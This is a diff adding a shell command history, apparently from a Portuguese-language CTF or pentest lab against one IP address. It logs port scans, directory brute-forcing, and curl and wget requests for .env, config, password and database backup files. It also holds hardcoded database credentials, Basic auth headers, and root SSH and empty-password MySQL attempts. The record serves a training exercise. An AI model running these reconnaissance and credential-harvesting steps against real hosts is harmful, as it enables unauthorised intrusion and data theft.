@@ -1,0 +1,83 @@
+
+exit
+nmap -Pn -sV 98.95.207.28
+telnet 98.95.207.28 80
+telnet 98.95.207.28 21
+telnet 98.95.207.28 3306
+
+curl http://98.95.207.28/index.php.env
+curl http://98.95.207.28/robots.txt
+curl http://98.95.207.28/.env
+ftp [target_ip]
+ftp 98.95.207.28
+cat flag.txt
+cat passwords.txt
+ftp 98.95.207.28
+cat users.conf
+ftp 98.95.207.28
+cat welcome.txt
+cat readme.txt
+cat users.conf
+
+gobuster dir -u http://98.95.207.28/ -w /usr/share/dirb/wordlists/common.txt
+gobuster dir -u http://98.95.207.28 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+http://98.95.207.28/flag.txt
+http://98.95.207.28/config
+curl http://98.95.207.28/config/
+curl http://98.95.207.28/.htaccess/
+curl http://98.95.207.28/secret_flag_8723.txt
+<?php
+$host = "localhost";
+$user = "admin";
+$password = "secretp@ss";
+$db = "db_sec";
+?>
+curl http://98.95.207.28/index.php | grep href
+curl -s http://98.95.207.28/config/
+curl -s http://98.95.207.28/config/db.php
+curl -s http://98.95.207.28/config/settings.ini
+curl http://98.95.207.28/robots.txt
+curl -s http://98.95.207.28/config/passwords.yml
+curl -s http://98.95.207.28/config/config.php
+curl -s http://98.95.207.28/config/database.yml
+telnet 98.95.207.28 80
+GET / HTTP/1.1
+Host: 98.95.207.28
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+GET / HTTP/1.1
+Host: 98.95.207.28
+Authorization: Basic [string_codificada_em_base64]
+GET / HTTP/1.1
+Host: 98.95.207.28
+Authorization: Basic [string_codificada_em_base64_aqui]
+echo -n "admin:password" | base64
+GET / HTTP/1.1
+Host: 98.95.207.28
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+nc -vn 98.95.207.28 2222
+ssh-keyscan -p 2222 98.95.207.28
+ssh -p 2222 root@98.95.207.28
+d49wYJQZ3cntL8AMOi3N4kCyxggKn0JH2uY8TKFqhho
+ssh -p 2222 usuario@98.95.207.28
+telnet 95.207.28 2222
+nc -vn 98.95.207.28 2222
+nmap -p 3306 --script=mysql-empty-password 98.95.207.28
+mysql -h 98.95.207.28 -u root -p
+(enter sem digitar nada)
+mysql -h 98.95.207.28 -u root -p
+ssh -i chave_privada.pem -p 2222 usuario@98.95.207.28
+nmap -sV -p 3306 --script=mysql-info 98.95.207.28
+nmap -p 3306 --script=mysql-empty-password 98.95.207.28
+mysql -h 98.95.207.28 -u root -p
+(enter sem digitar nada)
+echo 5f6f728267f5f173fbda2d07fe4cc691 | base64 -d 
+wget http://98.95.207.28/backup/database_backup_2024.sql
+logs --tail 50 > logs_evidencias.txt
+mkdir lab_ctf01
+cd lab_ctf01
+script -a sessao.log
+exit
+cd ..
+exit
+cat log_pentest_98.95.207.28_.log'
+history -a
